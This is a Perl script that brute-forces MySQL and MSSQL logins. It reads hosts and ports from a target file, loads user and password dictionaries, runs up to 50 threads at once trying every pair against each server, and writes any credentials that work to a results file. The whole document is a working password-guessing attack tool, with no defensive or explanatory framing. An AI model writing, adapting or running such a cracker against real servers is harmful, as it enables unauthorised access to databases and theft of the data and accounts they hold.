use strict;
use DBI;
use threads;

open OUT,">>result.txt";
my $thread_e=0;
open IN,"target.txt";
while (<IN>){
	my @thread_e=threads->list(threads::all);
	$thread_e=@thread_e;
	if ($thread_e<50){
		my $line=$_;
		chomp ($line);
		my @line=split /,/,$line;
		if ($line[0] eq "mysql"){
			my $t1 = threads->create(\&mysql,"$line[1]","$line[2]");
		}
		if ($line[0] eq "mssql"){
			my $t1 = threads->create(\&mssql,"$line[1]","$line[2]");
		}
	}
	else {
		foreach my $thread ( threads->list(threads::joinable) ){
			$thread->join();
		}
		redo;
	}
}
close IN;
foreach my $thread ( threads->list(threads::all) )
{
	$thread->join();
}
close OUT;


sub mysql{
	my @user;
	my @pass;
	open UN,"dic\\mysql_user.txt";
	while (<UN>){
		my $user=$_;
		chomp ($user);
		push @user,$user;
	}
	close UN;
	open PW,"dic\\mysql_pass.txt";
	while (<PW>){
		my $pass=$_;
		chomp ($pass);
		push @pass,$pass;
	}
	close PW;
	my $done=0;
	my $ip=$_[0];
	my $port=$_[1];
	my $dsn = "DBI:mysql:database=mysql;host=$ip;port=$port;mysql_connect_timeout=3";
	foreach my $user(@user){
		foreach my $pass(@pass){
			my $dbh = DBI->connect($dsn, $user, $pass);
			if ($dbh){
				my $out="mysql,$ip:$port,$user:$pass";
				print OUT $out."\n";
				$done=1;
				last;
			}
			sleep 1;
		}
		if ($done==1){
			last;
		}
	}
}

sub mssql{
	my @user;
	my @pass;
	open UN,"dic\\mssql_user.txt";
	while (<UN>){
		my $user=$_;
		chomp ($user);
		push @user,$user;
	}
	close UN;
	open PW,"dic\\mssql_pass.txt";
	while (<PW>){
		my $pass=$_;
		chomp ($pass);
		push @pass,$pass;
	}
	close PW;
	my $done=0;
	my $ip=$_[0];
	my $port=$_[1];
	foreach my $user(@user){
		foreach my $pass(@pass){
			print "mssql,$ip:$port,$user:$pass\n";
			my $dsn = "driver={SQL Server};Server=$ip;Port=$port;Database=master;UID=$user;PWD=$pass";
			my $dbh=DBI->connect("DBI:ODBC:$dsn");
			if ($dbh){
				my $out="mssql,$ip:$port,$user:$pass";
				print OUT $out."\n";
				$done=1;
				last;
			}
			sleep 1;
		}
		if ($done==1){
			last;
		}
	}
}